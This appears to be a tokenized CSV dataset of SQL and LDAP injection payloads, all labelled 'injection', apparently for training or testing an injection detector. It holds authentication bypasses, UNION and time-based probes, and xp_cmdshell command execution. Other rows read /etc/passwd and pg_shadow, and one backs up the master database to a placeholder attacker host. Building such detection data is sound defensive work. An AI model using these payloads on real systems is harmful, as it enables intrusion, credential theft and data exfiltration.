0,SMCLN MINUS MINUS,injection
23,INT waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
24,SQUT PRCNT 20or PRCNT INT SQUT SQUT EQ SQUT,injection
25,SQUT PRCNT 20or PRCNT INT EQ INT,injection
26,SQUT RPRN PRCNT 20or PRCNT INT LPRN SQUT x SQUT EQ SQUT x,injection
27,SQUT PRCNT 20or PRCNT INT SQUT x SQUT EQ SQUT x,injection
28,PRCNT 20or PRCNT 20x EQ x,injection
29,PRCNT INT SQUT sleep PRCNT INT SQUT,injection
30,PRCNT INT DLLR LPRN sleep PRCNT INT RPRN,injection
31,PRCNT INT,injection
32,INT OR INT EQ INT,injection
33,PRCNT INT,injection
34,PRCNT INT PRCNT 20or PRCNT INT EQ INT,injection
35,PRCNT INT,injection
36,PRCNT INT,injection
37,PRCNT 2a PRCNT INT PRCNT 7c PRCNT 28mail PRCNT 3d PRCNT 2a PRCNT INT PRCNT INT,injection
38,PRCNT 2a PRCNT INT PRCNT 7c PRCNT 28objectclass PRCNT 3d PRCNT 2a PRCNT INT PRCNT INT,injection
39,PRCNT 2a PRCNT 7c,injection
40,BITOR BITOR INT,injection
41,SQUT BITOR BITOR SQUT INT,injection
42,LPRN BITOR BITOR INT RPRN,injection
43,PRCNT 7c,injection
44,A SQUT,injection
45,ADMIN SQUT OR SQUT,injection
46,SQUT AND INT EQ LPRN IF LPRN LPRN load_file LPRN CHAR LPRN INT CMMA INT CMMA INT CMMA INT CMMA INT RPRN RPRN LT GT CHAR LPRN INT CMMA INT RPRN RPRN CMMA INT CMMA INT RPRN RPRN SMCLN,injection
47,SQUT AND INT IN LPRN SELECT var FROM TEMP RPRN MINUS MINUS,injection
48,anything SQUT OR SQUT x SQUT EQ SQUT x,injection
49,DQUT A DQUT DQUT OR INT EQ INT MINUS MINUS DQUT,injection
50,A SQUT OR INT EQ INT MINUS MINUS,injection
51,DQUT A DQUT DQUT OR INT EQ INT MINUS MINUS DQUT,injection
52,A SQUT OR INT EQ INT MINUS MINUS,injection
53,A SQUT OR SQUT A SQUT EQ SQUT A,injection
54,BITAND apos SMCLN PRCNT 20or,injection
55,AS,injection
56,ASC,injection
57,A SQUT waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
58,SQUT SMCLN BEGIN DECLARE ATR var VARCHAR LPRN INT RPRN SET ATR var EQ SQUT CLN SQUT SELECT ATR var EQ ATR var PLUS SQUT PLUS login PLUS SQUT SLSH SQUT PLUS PASSWORD PLUS SQUT SQUT FROM users WHERE login GT,injection
59,bfilename,injection
60,CHAR PRCNT INT PRCNT INT PRCNT 2b PRCNT 40select,injection
61,DECLARE ATR q nvarchar LPRN INT RPRN 0x730065006c00650063007400200040004000760065007200730069006f006e00 EXEC LPRN ATR q RPRN,injection
62,DECLARE ATR q nvarchar LPRN INT RPRN SELECT ATR q EQ 0x770061006900740066006f0072002000640065006c00610079002000270030003a0030003a0031003000270000 EXEC LPRN ATR q RPRN,injection
63,DECLARE ATR q nvarchar LPRN INT RPRN SELECT ATR q EQ,injection
64,DECLARE ATR s VARCHAR LPRN INT RPRN SELECT ATR s EQ 0x73656c65637420404076657273696f6e EXEC LPRN ATR s RPRN,injection
65,DECLARE ATR s VARCHAR LPRN INT RPRN SELECT ATR s EQ 0x77616974666f722064656c61792027303a303a31302700 EXEC LPRN ATR s RPRN,injection
66,DECLARE ATR s VARCHAR LPRN INT RPRN SELECT ATR s EQ,injection
67,DECLARE ATR s VARCHAR LPRN INT RPRN SELECT ATR s EQ 0x73656c65637420404076657273696f6e,injection
68,DELETE,injection
69,DESC,injection
70,DISTINCT,injection
71,SQUT BITOR BITOR LPRN elt LPRN MINUS INT PLUS INT CMMA bin LPRN INT RPRN CMMA ord LPRN INT RPRN CMMA HEX LPRN CHAR LPRN INT RPRN RPRN RPRN RPRN,injection
72,SQUT SMCLN EXEC master DOT DOT xp_cmdshell,injection
73,SQUT SMCLN EXEC master DOT DOT xp_cmdshell SQUT ping INT DOT INT DOT INT DOT INT SQUT MINUS MINUS,injection
74,EXEC LPRN ATR s RPRN,injection
75,SQUT SMCLN EXEC LPRN SQUT sel SQUT PLUS SQUT ect us SQUT PLUS SQUT er SQUT RPRN,injection
76,EXEC sp,injection
77,SQUT SMCLN EXECUTE IMMEDIATE SQUT sel SQUT BITOR BITOR SQUT ect us SQUT BITOR BITOR SQUT er SQUT,injection
78,EXEC xp,injection
79,SQUT SMCLN EXEC xp_regread,injection
80,SQUT GROUP BY userid HAVING INT EQ INT MINUS MINUS,injection
81,HANDLER,injection
82,HAVING,injection
83,SQUT HAVING INT EQ INT MINUS MINUS,injection
84,hi OR INT EQ INT MINUS MINUS DQUT,injection
85,hi SQUT OR INT EQ INT MINUS MINUS,injection
86,DQUT hi DQUT DQUT RPRN OR LPRN DQUT DQUT A DQUT DQUT EQ DQUT DQUT A DQUT,injection
87,hi OR A EQ A,injection
88,hi SQUT OR SQUT A SQUT EQ SQUT A,injection
89,hi SQUT RPRN OR LPRN SQUT A SQUT EQ SQUT A,injection
90,SQUT hi SQUT OR SQUT x SQUT EQ SQUT x SQUT SMCLN,injection
91,INSERT,injection
92,LIKE,injection
93,LIMIT,injection
94,STAR LPRN BITOR LPRN mail EQ STAR RPRN RPRN,injection
95,STAR LPRN BITOR LPRN objectclass EQ STAR RPRN RPRN,injection
96,OR,injection
97,SQUT OR SQUT SQUT EQ SQUT,injection
98,OR INT EQ INT HASH DQUT,injection
99,SQUT OR INT EQ INT MINUS MINUS,injection
100,SQUT OR INT EQ INT HASH,injection
101,DQUT OR INT EQ INT MINUS MINUS,injection
102,OR INT EQ INT MINUS MINUS,injection
103,OR INT EQ INT HASH,injection
104,SQUT OR INT MINUS MINUS SQUT,injection
105,SQUT OR INT SLSH STAR,injection
106,SMCLN OR SQUT INT SQUT EQ SQUT INT SQUT,injection
107,SQUT OR SQUT INT SQUT EQ SQUT INT,injection
108,SQUT OR SQUT INT SQUT EQ SQUT INT SQUT MINUS MINUS,injection
109,SQUT OR INT EQ INT,injection
110,SQUT OR INT EQ INT SLSH STAR,injection
111,SQUT OR INT EQ INT MINUS MINUS,injection
112,SQUT OR INT EQ INT MINUS MINUS,injection
113,SQUT SLSH STAR STAR SLSH OR SLSH STAR STAR SLSH INT SLSH STAR STAR SLSH EQ SLSH STAR STAR SLSH INT,injection
114,â€˜ OR INT EQ INT MINUS MINUS,injection
115,DQUT OR INT EQ INT MINUS MINUS,injection
116,OR INT EQ INT,injection
117,OR INT EQ INT MINUS MINUS,injection
118,OR INT EQ INT OR DQUT DQUT EQ,injection
119,SQUT OR INT EQ INT OR SQUT SQUT EQ SQUT,injection
120,SQUT OR INT IN LPRN SELECT ATR ATR VERSION RPRN MINUS MINUS,injection
121,OR PRCNT INT EQ INT,injection
122,OR PRCNT INT EQ INT MINUS MINUS,injection
123,SQUT OR INT GT INT,injection
124,SQUT OR INT BETWEEN INT AND INT,injection
125,SQUT OR INT EQ INT,injection
126,â€˜ OR INT EQ INT MINUS MINUS,injection
127,SQUT OR SQUT INT SQUT EQ SQUT INT,injection
128,OR A EQ A,injection
129,OR A EQ A,injection
130,SQUT OR SQUT A SQUT EQ SQUT A,injection
131,SQUT OR A EQ A MINUS MINUS,injection
132,SQUT RPRN OR LPRN SQUT A SQUT EQ SQUT A,injection
133,DQUT OR DQUT A DQUT EQ DQUT A,injection
134,RPRN OR LPRN A EQ A,injection
135,ORDER BY,injection
136,SQUT OR LPRN EXISTS RPRN,injection
137,OR ISNULL LPRN INT SLSH INT RPRN SLSH STAR,injection
138,DQUT OR ISNULL LPRN INT SLSH INT RPRN SLSH STAR,injection
139,SQUT OR SQUT something SQUT LIKE SQUT SOME PRCNT SQUT,injection
140,SQUT OR SQUT something SQUT EQ SQUT SOME SQUT PLUS SQUT thing SQUT,injection
141,SQUT OR SQUT TEXT SQUT EQ n SQUT TEXT SQUT,injection
142,SQUT OR SQUT TEXT SQUT GT SQUT T SQUT,injection
143,SQUT OR uid LIKE SQUT PRCNT,injection
144,SQUT OR uname LIKE SQUT PRCNT,injection
145,SQUT OR SQUT unusual SQUT EQ SQUT unusual SQUT,injection
146,SQUT OR userid LIKE SQUT PRCNT,injection
147,SQUT OR USER LIKE SQUT PRCNT,injection
148,SQUT OR username LIKE SQUT PRCNT,injection
149,SQUT OR username LIKE CHAR LPRN INT RPRN SMCLN,injection
150,SQUT OR SQUT whatever SQUT IN LPRN SQUT whatever SQUT RPRN,injection
151,SQUT MINUS MINUS BITAND PASSWORD EQ,injection
152,PASSWORD CLN STAR SLSH EQ INT MINUS MINUS,injection
153,print,injection
154,print ATR ATR variable,injection
155,PROCEDURE,injection
156,REPLACE,injection
157,SELECT,injection
158,SQUT SELECT STAR FROM information_schema DOT TABLES MINUS MINUS,injection
159,SQUT SELECT NAME FROM syscolumns WHERE ID EQ LPRN SELECT ID FROM sysobjects WHERE NAME EQ tablename SQUT RPRN MINUS MINUS,injection
160,SQUT LPRN SELECT top INT,injection
161,MINUS MINUS sp_password,injection
162,SQUT sqlattempt1,injection
163,LPRN sqlattempt2 RPRN,injection
164,SQUT sqlvuln,injection
165,SQUT PLUS sqlvuln,injection
166,LPRN sqlvuln RPRN,injection
167,sqlvuln SMCLN,injection
168,T SQUT EXEC master DOT DOT xp_cmdshell SQUT nslookup www DOT google DOT com SQUT MINUS MINUS,injection
169,to_timestamp_tz,injection
170,TRUNCATE,injection
171,tz_offset,injection
172,SQUT UNION ALL SELECT,injection
173,SQUT UNION ALL SELECT ATR ATR VERSION MINUS MINUS,injection
174,SQUT UNION SELECT,injection
175,uni SLSH STAR STAR SLSH ON sel SLSH STAR STAR SLSH ect,injection
176,SQUT UNION SELECT,injection
177,SQUT UNION SELECT INT CMMA load_file LPRN SQUT SLSH etc SLSH passwd SQUT RPRN CMMA INT CMMA INT CMMA INT SMCLN,injection
178,RPRN UNION SELECT STAR FROM information_schema DOT TABLES SMCLN,injection
179,SQUT UNION SELECT STAR FROM users WHERE login EQ CHAR LPRN INT CMMA INT CMMA INT CMMA INT RPRN SMCLN,injection
180,UPDATE,injection
181,SQUT BITOR BITOR utl_http DOT request,injection
182,CMMA ATR variable,injection
183,ATR variable,injection
184,ATR var SELECT ATR var AS var INTO TEMP END MINUS MINUS,injection
185,BSLSH x27union SELECT,injection
186,x SQUT AND INT EQ LPRN SELECT COUNT LPRN STAR RPRN FROM tabname RPRN SMCLN MINUS MINUS,injection
187,x SQUT AND email IS NULL SMCLN MINUS MINUS,injection
188,x SQUT AND members DOT email IS NULL SMCLN MINUS MINUS,injection
189,x SQUT AND userid IS NULL SMCLN MINUS MINUS,injection
190,x SQUT OR INT EQ INT OR SQUT x SQUT EQ SQUT y,injection
191,x SQUT OR full_name LIKE SQUT PRCNT bob PRCNT,injection
192,ã½ OR INT EQ INT MINUS MINUS,injection
0,SELECT versionnumber CMMA version_timestamp FROM sysibm DOT sysversions SMCLN,injection
1,SELECT USER FROM sysibm DOT sysdummy1 SMCLN,injection
2,SELECT SESSION_USER FROM sysibm DOT sysdummy1 SMCLN,injection
3,SELECT SYSTEM_USER FROM sysibm DOT sysdummy1 SMCLN,injection
4,SELECT CURRENT SERVER FROM sysibm DOT sysdummy1 SMCLN,injection
5,SELECT NAME FROM sysibm DOT systables SMCLN,injection
6,SELECT grantee FROM syscat DOT dbauth SMCLN,injection
7,SELECT STAR FROM syscat DOT tabauth SMCLN,injection
8,SELECT STAR FROM syscat DOT dbauth WHERE grantee EQ CURRENT USER SMCLN,injection
9,SELECT STAR FROM syscat DOT tabauth WHERE grantee EQ CURRENT USER SMCLN,injection
10,SELECT NAME CMMA tbname CMMA coltype FROM sysibm DOT syscolumns SMCLN,injection
11,SELECT schemaname FROM syscat DOT schemata SMCLN,injection
0,SELECT ATR ATR VERSION,injection
1,SELECT ATR ATR servernamee,injection
2,SELECT ATR ATR microsoftversione,injection
3,SELECT STAR FROM master DOT DOT sysserverse,injection
4,SELECT STAR FROM sysusers,injection
5,EXEC master DOT DOT xp_cmdshell SQUT ipconfig PLUS SLSH ALL SQUT,injection
6,EXEC master DOT DOT xp_cmdshell SQUT net PLUS VIEW SQUT,injection
7,EXEC master DOT DOT xp_cmdshell SQUT net PLUS users SQUT,injection
8,EXEC master DOT DOT xp_cmdshell SQUT ping PLUS LT attackerip GT SQUT,injection
9,backup DATABASE master TO disks EQ SQUT BSLSH BSLSH LT attackerip GT BSLSH LT attackerip GT BSLSH backupdb DOT dat SQUT,injection
10,CREATE TABLE myfile LPRN line VARCHAR LPRN INT RPRN RPRN DQUT bulk INSERT foo FROM SQUT C CLN BSLSH inetpub BSLSH wwwroot BSLSH auth DOT aspâ SQUT DQUT SELECT STAR FROM myfile DQUT MINUS MINUS,injection
0,LT username GT SQUT OR INT EQ INT MINUS MINUS,injection
1,SQUT OR SQUT SQUT EQ SQUT allows authentication WITHOUT A VALID username DOT,injection
2,LT username GT SQUT MINUS MINUS,injection
3,SQUT UNION SELECT INT CMMA SQUT LT USER MINUS fieldname GT SQUT CMMA SQUT LT pass MINUS fieldname GT SQUT INT MINUS MINUS,injection
4,SQUT OR INT EQ INT MINUS MINUS,injection
0,CREATE TABLE myfile LPRN INPUT TEXT RPRN SMCLN LOAD DATA INFILE SQUT LT filepath GT SQUT INTO TABLE myfile SMCLN SELECT STAR FROM myfile SMCLN,injection
0,SELECT VERSION LPRN RPRN SMCLN,injection
1,SELECT current_database LPRN RPRN SMCLN,injection
2,SELECT CURRENT_USER SMCLN,injection
3,SELECT SESSION_USER SMCLN,injection
4,SELECT current_setting LPRN SQUT log_connections SQUT RPRN SMCLN,injection
5,SELECT current_setting LPRN SQUT log_statement SQUT RPRN SMCLN,injection
6,SELECT current_setting LPRN SQUT port SQUT RPRN SMCLN,injection
7,SELECT current_setting LPRN SQUT password_encryption SQUT RPRN SMCLN,injection
8,SELECT current_setting LPRN SQUT krb_server_keyfile SQUT RPRN SMCLN,injection
9,SELECT current_setting LPRN SQUT virtual_host SQUT RPRN SMCLN,injection
10,SELECT current_setting LPRN SQUT port SQUT RPRN SMCLN,injection
11,SELECT current_setting LPRN SQUT config_file SQUT RPRN SMCLN,injection
12,SELECT current_setting LPRN SQUT hba_file SQUT RPRN SMCLN,injection
13,SELECT current_setting LPRN SQUT data_directory SQUT RPRN SMCLN,injection
14,SELECT STAR FROM pg_shadow SMCLN,injection
15,SELECT STAR FROM pg_group SMCLN,injection
16,CREATE TABLE myfile LPRN INPUT TEXT RPRN SMCLN,injection
17,COPY myfile FROM SQUT SLSH etc SLSH passwd SQUT SMCLN,injection
18,SELECT STAR FROM myfile SMCLN COPY myfile TO SLSH tmp SLSH test SMCLN,injection
0,RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
1,RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
2,SQUT RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
3,SQUT RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
4,DQUT RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
5,DQUT RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
6,RPRN RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
7,RPRN RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
8,SQUT RPRN RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
9,SQUT RPRN RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
10,DQUT RPRN RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
11,DQUT RPRN RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
12,CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
13,CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
14,SQUT CMMA NULL RPRN PRCNT 20waifor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
15,SQUT CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
16,DQUT CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
17,DQUT CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
18,RPRN CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
19,RPRN CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
20,SQUT RPRN CMMA NULL RPRN PRCNT 20waifor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
21,SQUT RPRN CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
22,DQUT RPRN CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
23,DQUT RPRN CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
24,CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
25,CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
26,SQUT CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
27,SQUT CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
28,DQUT CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
29,DQUT CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
30,RPRN CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
31,RPRN CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
32,SQUT RPRN CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
33,SQUT RPRN CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
34,DQUT RPRN CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
35,DQUT RPRN CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
36,CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
37,CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
38,SQUT CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
39,SQUT CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
40,DQUT CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
41,DQUT CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
42,RPRN CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
43,RPRN CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
44,SQUT RPRN CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
45,SQUT RPRN CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
46,DQUT RPRN CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
47,DQUT RPRN CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
48,CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
